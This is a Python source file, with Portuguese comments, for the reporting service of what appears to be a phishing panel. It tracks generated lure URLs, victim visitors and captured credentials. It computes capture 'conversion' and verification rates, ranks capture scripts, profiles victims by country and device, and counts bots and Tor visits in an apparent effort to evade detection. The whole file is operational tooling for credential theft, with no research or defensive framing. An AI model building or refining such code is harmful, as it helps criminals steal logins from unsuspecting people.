from datetime import datetime, timedelta
from src.models.user import db, User, GeneratedURL, Visitor, CapturedCredential, Log, Script, Domain
import pandas as pd
import plotly.graph_objects as go
import plotly.express as px
from plotly.utils import PlotlyJSONEncoder
import json
import io
import base64

class ReportService:
    """Serviço para geração de relatórios detalhados"""
    
    @staticmethod
    def generate_user_performance_report(user_id, days=30):
        """Gera relatório de performance do usuário"""
        try:
            end_date = datetime.utcnow()
            start_date = end_date - timedelta(days=days)
            
            # Dados básicos
            user = User.query.get(user_id)
            if not user:
                return None
            
            # URLs geradas
            urls_query = GeneratedURL.query.filter(
                GeneratedURL.user_id == user_id,
                GeneratedURL.created_at >= start_date
            )
            total_urls = urls_query.count()
            active_urls = urls_query.filter_by(is_active=True).count()
            
            # Visitantes
            visitors_query = db.session.query(Visitor).join(GeneratedURL).filter(
                GeneratedURL.user_id == user_id,
                Visitor.first_visit >= start_date
            )
            total_visitors = visitors_query.count()
            unique_visitors = visitors_query.distinct(Visitor.ip_address).count()
            
            # Credenciais capturadas
            credentials_query = CapturedCredential.query.filter(
                CapturedCredential.user_id == user_id,
                CapturedCredential.captured_at >= start_date
            )
            total_credentials = credentials_query.count()
            verified_credentials = credentials_query.filter_by(is_verified=True).count()
            
            # Taxa de conversão
            conversion_rate = (total_credentials / total_visitors * 100) if total_visitors > 0 else 0
            verification_rate = (verified_credentials / total_credentials * 100) if total_credentials > 0 else 0
            
            # Dados por dia
            daily_data = ReportService._get_daily_data(user_id, start_date, end_date)
            
            # Scripts mais eficazes
            script_performance = ReportService._get_script_performance(user_id, start_date, end_date)
            
            # Países dos visitantes
            country_stats = ReportService._get_country_stats(user_id, start_date, end_date)
            
            # Dispositivos e navegadores
            device_stats = ReportService._get_device_stats(user_id, start_date, end_date)
            
            return {
                'user_info': {
                    'username': user.username,
                    'email': user.email,
                    'credits': user.credits,
                    'member_since': user.created_at.isoformat() if user.created_at else None
                },
                'period': {
                    'start_date': start_date.isoformat(),
                    'end_date': end_date.isoformat(),
                    'days': days
                },
                'summary': {
                    'total_urls': total_urls,
                    'active_urls': active_urls,
                    'total_visitors': total_visitors,
                    'unique_visitors': unique_visitors,
                    'total_credentials': total_credentials,
                    'verified_credentials': verified_credentials,
                    'conversion_rate': round(conversion_rate, 2),
                    'verification_rate': round(verification_rate, 2)
                },
                'daily_data': daily_data,
                'script_performance': script_performance,
                'country_stats': country_stats,
                'device_stats': device_stats
            }
            
        except Exception as e:
            print(f"Erro ao gerar relatório de performance: {e}")
            return None
    
    @staticmethod
    def _get_daily_data(user_id, start_date, end_date):
        """Obtém dados diários para gráficos"""
        try:
            # URLs criadas por dia
            urls_daily = db.session.query(
                db.func.date(GeneratedURL.created_at).label('date'),
                db.func.count(GeneratedURL.id).label('urls_created')
            ).filter(
                GeneratedURL.user_id == user_id,
                GeneratedURL.created_at >= start_date,
                GeneratedURL.created_at <= end_date
            ).group_by(db.func.date(GeneratedURL.created_at)).all()
            
            # Visitantes por dia
            visitors_daily = db.session.query(
                db.func.date(Visitor.first_visit).label('date'),
                db.func.count(Visitor.id).label('visitors')
            ).join(GeneratedURL).filter(
                GeneratedURL.user_id == user_id,
                Visitor.first_visit >= start_date,
                Visitor.first_visit <= end_date
            ).group_by(db.func.date(Visitor.first_visit)).all()
            
            # Credenciais por dia
            credentials_daily = db.session.query(
                db.func.date(CapturedCredential.captured_at).label('date'),
                db.func.count(CapturedCredential.id).label('credentials')
            ).filter(
                CapturedCredential.user_id == user_id,
                CapturedCredential.captured_at >= start_date,
                CapturedCredential.captured_at <= end_date
            ).group_by(db.func.date(CapturedCredential.captured_at)).all()
            
            # Combinar dados
            daily_dict = {}
            
            for item in urls_daily:
                date_str = str(item.date)
                daily_dict[date_str] = daily_dict.get(date_str, {})
                daily_dict[date_str]['urls_created'] = item.urls_created
            
            for item in visitors_daily:
                date_str = str(item.date)
                daily_dict[date_str] = daily_dict.get(date_str, {})
                daily_dict[date_str]['visitors'] = item.visitors
            
            for item in credentials_daily:
                date_str = str(item.date)
                daily_dict[date_str] = daily_dict.get(date_str, {})
                daily_dict[date_str]['credentials'] = item.credentials
            
            # Preencher dias faltantes
            current_date = start_date.date()
            end_date_only = end_date.date()
            
            while current_date <= end_date_only:
                date_str = str(current_date)
                if date_str not in daily_dict:
                    daily_dict[date_str] = {}
                
                daily_dict[date_str].setdefault('urls_created', 0)
                daily_dict[date_str].setdefault('visitors', 0)
                daily_dict[date_str].setdefault('credentials', 0)
                
                current_date += timedelta(days=1)
            
            return [
                {
                    'date': date,
                    'urls_created': data['urls_created'],
                    'visitors': data['visitors'],
                    'credentials': data['credentials']
                }
                for date, data in sorted(daily_dict.items())
            ]
            
        except Exception as e:
            print(f"Erro ao obter dados diários: {e}")
            return []
    
    @staticmethod
    def _get_script_performance(user_id, start_date, end_date):
        """Obtém performance dos scripts"""
        try:
            script_stats = db.session.query(
                CapturedCredential.script_name,
                db.func.count(CapturedCredential.id).label('total_captures'),
                db.func.count(db.case([(CapturedCredential.is_verified == True, 1)])).label('verified_captures')
            ).filter(
                CapturedCredential.user_id == user_id,
                CapturedCredential.captured_at >= start_date,
                CapturedCredential.captured_at <= end_date
            ).group_by(CapturedCredential.script_name).all()
            
            return [
                {
                    'script_name': stat.script_name,
                    'total_captures': stat.total_captures,
                    'verified_captures': stat.verified_captures,
                    'verification_rate': round(
                        (stat.verified_captures / stat.total_captures * 100) if stat.total_captures > 0 else 0, 2
                    )
                }
                for stat in script_stats
            ]
            
        except Exception as e:
            print(f"Erro ao obter performance dos scripts: {e}")
            return []
    
    @staticmethod
    def _get_country_stats(user_id, start_date, end_date):
        """Obtém estatísticas por país"""
        try:
            country_stats = db.session.query(
                Visitor.country,
                db.func.count(Visitor.id).label('visitor_count'),
                db.func.count(db.distinct(Visitor.ip_address)).label('unique_visitors')
            ).join(GeneratedURL).filter(
                GeneratedURL.user_id == user_id,
                Visitor.first_visit >= start_date,
                Visitor.first_visit <= end_date
            ).group_by(Visitor.country).order_by(
                db.func.count(Visitor.id).desc()
            ).limit(10).all()
            
            return [
                {
                    'country': stat.country,
                    'visitor_count': stat.visitor_count,
                    'unique_visitors': stat.unique_visitors
                }
                for stat in country_stats
            ]
            
        except Exception as e:
            print(f"Erro ao obter estatísticas por país: {e}")
            return []
    
    @staticmethod
    def _get_device_stats(user_id, start_date, end_date):
        """Obtém estatísticas de dispositivos"""
        try:
            device_stats = db.session.query(
                Visitor.device_type,
                Visitor.browser,
                Visitor.operating_system,
                db.func.count(Visitor.id).label('count')
            ).join(GeneratedURL).filter(
                GeneratedURL.user_id == user_id,
                Visitor.first_visit >= start_date,
                Visitor.first_visit <= end_date
            ).group_by(
                Visitor.device_type,
                Visitor.browser,
                Visitor.operating_system
            ).all()
            
            # Agrupar por tipo de dispositivo
            device_summary = {}
            browser_summary = {}
            os_summary = {}
            
            for stat in device_stats:
                # Dispositivos
                device = stat.device_type or 'Desconhecido'
                device_summary[device] = device_summary.get(device, 0) + stat.count
                
                # Navegadores
                browser = stat.browser or 'Desconhecido'
                browser_summary[browser] = browser_summary.get(browser, 0) + stat.count
                
                # Sistemas operacionais
                os = stat.operating_system or 'Desconhecido'
                os_summary[os] = os_summary.get(os, 0) + stat.count
            
            return {
                'devices': [{'name': k, 'count': v} for k, v in sorted(device_summary.items(), key=lambda x: x[1], reverse=True)],
                'browsers': [{'name': k, 'count': v} for k, v in sorted(browser_summary.items(), key=lambda x: x[1], reverse=True)],
                'operating_systems': [{'name': k, 'count': v} for k, v in sorted(os_summary.items(), key=lambda x: x[1], reverse=True)]
            }
            
        except Exception as e:
            print(f"Erro ao obter estatísticas de dispositivos: {e}")
            return {'devices': [], 'browsers': [], 'operating_systems': []}
    
    @staticmethod
    def generate_security_report(user_id, days=30):
        """Gera relatório de segurança"""
        try:
            end_date = datetime.utcnow()
            start_date = end_date - timedelta(days=days)
            
            # Detecções de bot
            bot_detections = db.session.query(Visitor).join(GeneratedURL).filter(
                GeneratedURL.user_id == user_id,
                Visitor.is_bot == True,
                Visitor.first_visit >= start_date
            ).count()
            
            # Atividades suspeitas
            suspicious_activities = db.session.query(
                db.func.count(Log.id).label('count')
            ).filter(
                Log.user_id == user_id,
                Log.action.like('%suspicious%'),
                Log.timestamp >= start_date
            ).scalar() or 0
            
            # IPs únicos
            unique_ips = db.session.query(
                db.func.count(db.distinct(Visitor.ip_address))
            ).join(GeneratedURL).filter(
                GeneratedURL.user_id == user_id,
                Visitor.first_visit >= start_date
            ).scalar() or 0
            
            # Países de risco (exemplo)
            risk_countries = ['Unknown', 'Anonymous', 'Tor']
            risky_visits = db.session.query(Visitor).join(GeneratedURL).filter(
                GeneratedURL.user_id == user_id,
                Visitor.country.in_(risk_countries),
                Visitor.first_visit >= start_date
            ).count()
            
            # Tentativas de acesso fora do horário normal
            off_hours_visits = db.session.query(Visitor).join(GeneratedURL).filter(
                GeneratedURL.user_id == user_id,
                db.or_(
                    db.extract('hour', Visitor.first_visit) < 6,
                    db.extract('hour', Visitor.first_visit) > 23
                ),
                Visitor.first_visit >= start_date
            ).count()
            
            return {
                'period': {
                    'start_date': start_date.isoformat(),
                    'end_date': end_date.isoformat(),
                    'days': days
                },
                'security_metrics': {
                    'bot_detections': bot_detections,
                    'suspicious_activities': suspicious_activities,
                    'unique_ips': unique_ips,
                    'risky_visits': risky_visits,
                    'off_hours_visits': off_hours_visits
                },
                'risk_assessment': ReportService._calculate_risk_score(
                    bot_detections, suspicious_activities, risky_visits, off_hours_visits
                )
            }
            
        except Exception as e:
            print(f"Erro ao gerar relatório de segurança: {e}")
            return None
    
    @staticmethod
    def _calculate_risk_score(bot_detections, suspicious_activities, risky_visits, off_hours_visits):
        """Calcula score de risco"""
        try:
            # Algoritmo simples de score de risco
            risk_score = 0
            risk_factors = []
            
            if bot_detections > 10:
                risk_score += 30
                risk_factors.append(f"Alto número de bots detectados ({bot_detections})")
            elif bot_detections > 5:
                risk_score += 15
                risk_factors.append(f"Bots detectados ({bot_detections})")
            
            if suspicious_activities > 5:
                risk_score += 25
                risk_factors.append(f"Atividades suspeitas ({suspicious_activities})")
            
            if risky_visits > 5:
                risk_score += 20
                risk_factors.append(f"Visitas de países de risco ({risky_visits})")
            
            if off_hours_visits > 10:
                risk_score += 15
                risk_factors.append(f"Acessos fora do horário ({off_hours_visits})")
            
            # Determinar nível de risco
            if risk_score >= 70:
                risk_level = "Alto"
                risk_color = "red"
            elif risk_score >= 40:
                risk_level = "Médio"
                risk_color = "orange"
            elif risk_score >= 20:
                risk_level = "Baixo"
                risk_color = "yellow"
            else:
                risk_level = "Muito Baixo"
                risk_color = "green"
            
            return {
                'score': min(risk_score, 100),
                'level': risk_level,
                'color': risk_color,
                'factors': risk_factors
            }
            
        except Exception as e:
            print(f"Erro ao calcular score de risco: {e}")
            return {'score': 0, 'level': 'Desconhecido', 'color': 'gray', 'factors': []}
    
    @staticmethod
    def generate_charts(report_data):
        """Gera gráficos para o relatório"""
        try:
            charts = {}
            
            # Gráfico de atividade diária
            if 'daily_data' in report_data:
                daily_data = report_data['daily_data']
                dates = [item['date'] for item in daily_data]
                
                fig = go.Figure()
                fig.add_trace(go.Scatter(
                    x=dates,
                    y=[item['visitors'] for item in daily_data],
                    mode='lines+markers',
                    name='Visitantes',
                    line=dict(color='blue')
                ))
                fig.add_trace(go.Scatter(
                    x=dates,
                    y=[item['credentials'] for item in daily_data],
                    mode='lines+markers',
                    name='Credenciais',
                    line=dict(color='red')
                ))
                
                fig.update_layout(
                    title='Atividade Diária',
                    xaxis_title='Data',
                    yaxis_title='Quantidade',
                    hovermode='x unified'
                )
                
                charts['daily_activity'] = json.dumps(fig, cls=PlotlyJSONEncoder)
            
            # Gráfico de performance dos scripts
            if 'script_performance' in report_data:
                script_data = report_data['script_performance']
                if script_data:
                    fig = go.Figure(data=[
                        go.Bar(
                            x=[item['script_name'] for item in script_data],
                            y=[item['total_captures'] for item in script_data],
                            name='Total de Capturas'
                        )
                    ])
                    
                    fig.update_layout(
                        title='Performance dos Scripts',
                        xaxis_title='Script',
                        yaxis_title='Capturas'
                    )
                    
                    charts['script_performance'] = json.dumps(fig, cls=PlotlyJSONEncoder)
            
            # Gráfico de países
            if 'country_stats' in report_data:
                country_data = report_data['country_stats']
                if country_data:
                    fig = go.Figure(data=[
                        go.Pie(
                            labels=[item['country'] for item in country_data],
                            values=[item['visitor_count'] for item in country_data],
                            hole=0.3
                        )
                    ])
                    
                    fig.update_layout(title='Visitantes por País')
                    charts['countries'] = json.dumps(fig, cls=PlotlyJSONEncoder)
            
            return charts
            
        except Exception as e:
            print(f"Erro ao gerar gráficos: {e}")
            return {}
    
    @staticmethod
    def export_report_to_pdf(report_data, charts_data=None):
        """Exporta relatório para PDF"""
        try:
            # Criar conteúdo Markdown
            markdown_content = ReportService._generate_markdown_report(report_data, charts_data)
            
            # Salvar em arquivo temporário
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', suffix='.md', delete=False) as temp_md:
                temp_md.write(markdown_content)
                temp_md_path = temp_md.name
            
            # Converter para PDF
            pdf_path = temp_md_path.replace('.md', '.pdf')
            
            # Usar utilitário manus-md-to-pdf
            import subprocess
            result = subprocess.run(['manus-md-to-pdf', temp_md_path, pdf_path], 
                                  capture_output=True, text=True)
            
            if result.returncode == 0:
                return pdf_path
            else:
                print(f"Erro ao converter para PDF: {result.stderr}")
                return None
                
        except Exception as e:
            print(f"Erro ao exportar para PDF: {e}")
            return None
    
    @staticmethod
    def _generate_markdown_report(report_data, charts_data=None):
        """Gera relatório em formato Markdown"""
        try:
            md_content = f"""# Relatório de Performance

## Informações do Usuário
- **Usuário:** {report_data.get('user_info', {}).get('username', 'N/A')}
- **Email:** {report_data.get('user_info', {}).get('email', 'N/A')}
- **Créditos:** {report_data.get('user_info', {}).get('credits', 0)}

## Período do Relatório
- **Data Início:** {report_data.get('period', {}).get('start_date', 'N/A')}
- **Data Fim:** {report_data.get('period', {}).get('end_date', 'N/A')}
- **Dias:** {report_data.get('period', {}).get('days', 0)}

## Resumo Executivo
- **URLs Criadas:** {report_data.get('summary', {}).get('total_urls', 0)}
- **URLs Ativas:** {report_data.get('summary', {}).get('active_urls', 0)}
- **Total de Visitantes:** {report_data.get('summary', {}).get('total_visitors', 0)}
- **Visitantes Únicos:** {report_data.get('summary', {}).get('unique_visitors', 0)}
- **Credenciais Capturadas:** {report_data.get('summary', {}).get('total_credentials', 0)}
- **Credenciais Verificadas:** {report_data.get('summary', {}).get('verified_credentials', 0)}
- **Taxa de Conversão:** {report_data.get('summary', {}).get('conversion_rate', 0)}%
- **Taxa de Verificação:** {report_data.get('summary', {}).get('verification_rate', 0)}%

## Performance dos Scripts
"""
            
            # Adicionar dados dos scripts
            script_performance = report_data.get('script_performance', [])
            if script_performance:
                md_content += "\n| Script | Capturas | Verificadas | Taxa |\n|--------|----------|-------------|------|\n"
                for script in script_performance:
                    md_content += f"| {script['script_name']} | {script['total_captures']} | {script['verified_captures']} | {script['verification_rate']}% |\n"
            else:
                md_content += "\nNenhum dado de script disponível.\n"
            
            # Adicionar estatísticas por país
            md_content += "\n## Visitantes por País\n"
            country_stats = report_data.get('country_stats', [])
            if country_stats:
                md_content += "\n| País | Visitantes | Únicos |\n|------|------------|--------|\n"
                for country in country_stats:
                    md_content += f"| {country['country']} | {country['visitor_count']} | {country['unique_visitors']} |\n"
            else:
                md_content += "\nNenhum dado de país disponível.\n"
            
            md_content += f"\n---\n*Relatório gerado em {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}*\n"
            
            return md_content
            
        except Exception as e:
            print(f"Erro ao gerar Markdown: {e}")
            return "# Erro ao gerar relatório"

